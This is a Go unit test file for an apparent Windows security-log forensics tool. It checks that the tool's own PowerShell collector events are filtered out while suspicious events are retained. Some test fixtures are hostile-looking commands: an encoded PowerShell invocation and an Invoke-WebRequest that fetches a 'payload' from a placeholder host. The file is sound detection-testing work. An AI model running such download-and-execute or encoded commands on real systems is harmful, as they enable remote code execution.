package securitylog

import "testing"

func TestIsWinTraceLensCollectorEvent(t *testing.T) {
	tests := []struct {
		name  string
		event Event
		want  bool
	}{
		{
			name:  "marked collector",
			event: Event{Category: "PowerShell日志", Command: "# WTL-COLLECTOR WinTraceLens evidence collector"},
			want:  true,
		},
		{
			name:  "legacy event collector",
			event: Event{Category: "PowerShell日志", Message: "function New-EventFilter {} function Convert-SecurityAction {}"},
			want:  true,
		},
		{
			name:  "malicious powershell retained",
			event: Event{Category: "PowerShell日志", Command: "powershell -EncodedCommand SQBFAFgA"},
			want:  false,
		},
		{
			name:  "similar generic script retained",
			event: Event{Category: "PowerShell日志", Command: "Get-WinEvent -LogName Security | ConvertTo-Json"},
			want:  false,
		},
		{
			name:  "legacy process inventory collector",
			event: Event{Category: "PowerShell日志", Message: "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId | ConvertTo-Json"},
			want:  true,
		},
		{
			name:  "non powershell not filtered",
			event: Event{Category: "服务创建", Command: "WTL-COLLECTOR"},
			want:  false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsWinTraceLensCollectorEvent(tt.event); got != tt.want {
				t.Fatalf("IsWinTraceLensCollectorEvent() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestFilterCollectorEvents(t *testing.T) {
	events := []Event{
		{Category: "PowerShell日志", Command: "# WTL-COLLECTOR"},
		{Category: "PowerShell日志", Command: "Invoke-WebRequest https://example.invalid/payload"},
	}
	filtered := FilterCollectorEvents(events)
	if len(filtered) != 1 || filtered[0].Command != events[1].Command {
		t.Fatalf("FilterCollectorEvents() = %#v", filtered)
	}
}

func TestIsLowValuePowerShellEvent(t *testing.T) {
	if !IsLowValuePowerShellEvent(Event{Category: "PowerShell日志", EventID: "600", Message: "Provider started"}) {
		t.Fatal("routine provider event should be low value")
	}
	if IsLowValuePowerShellEvent(Event{Category: "PowerShell日志", EventID: "4104", Command: "Get-Process"}) {
		t.Fatal("script block should remain available")
	}
	if IsLowValuePowerShellEvent(Event{Category: "PowerShell日志", EventID: "4103", Command: "Invoke-WebRequest https://example.invalid/payload"}) {
		t.Fatal("suspicious module event should not be hidden")
	}
}
